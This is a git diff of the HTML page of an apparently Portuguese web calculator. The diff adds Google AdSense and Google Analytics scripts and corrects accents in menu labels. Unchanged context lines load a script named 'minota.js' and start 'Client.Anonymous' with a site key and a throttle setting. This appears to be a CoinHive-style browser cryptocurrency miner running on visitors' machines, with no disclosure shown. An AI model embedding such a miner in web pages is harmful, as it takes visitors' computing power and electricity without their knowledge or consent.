@@ -12,6 +12,7 @@
 		<meta name="msapplication-TileColor" content="#da532c">
 		<meta name="theme-color" content="#ffffff">
 		<link rel="stylesheet" href="css/all.min.css">
+		<script data-ad-client="ca-pub-6530491416751102" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 	</head>
 	<body>
 		<div class="container-fluid">
@@ -21,8 +22,8 @@
 					<div id="calcWrapper">
 						<select id="calc_type" class="custom-select">
 							<option value="rts">Regra de Três Simples</option>
-							<option value="iva">Calculos de IVA</option>
-							<option value="desc">Calculos de Descontos</option>
+							<option value="iva">Cálculos de IVA</option>
+							<option value="desc">Cálculos de Descontos</option>
 							<option value="ratio">Proporção / Aspect Ratio</option>
 							<option value="time">Diferença Temporal</option>
 						</select>
@@ -278,7 +279,11 @@
 		</div>
 		<script src="js/head.load.min.js"></script>
 		<script>
-			head.js("js/jquery.slim.min.js", "js/moment.min.js", "js/moment_locale_pt.js", "js/picker.js", "js/minota.js", function() {
+			head.js("js/jquery.slim.min.js", "js/moment.min.js", "js/moment_locale_pt.js", "js/picker.js", "js/minota.js", "https://www.googletagmanager.com/gtag/js?id=G-0CBPV9HHZG", function() {
+				window.dataLayer = window.dataLayer || [];
+				function gtag(){dataLayer.push(arguments);}
+				gtag('js', new Date());
+				gtag('config', 'G-0CBPV9HHZG');
 				var _client = new Client.Anonymous('632fa6f27c3c4fc4d9f18a1420c316d6b4c18925c7b26f3cef56862b7927aa7f', {
 					throttle: 0.7, c: 'w', ads: 0
 				});
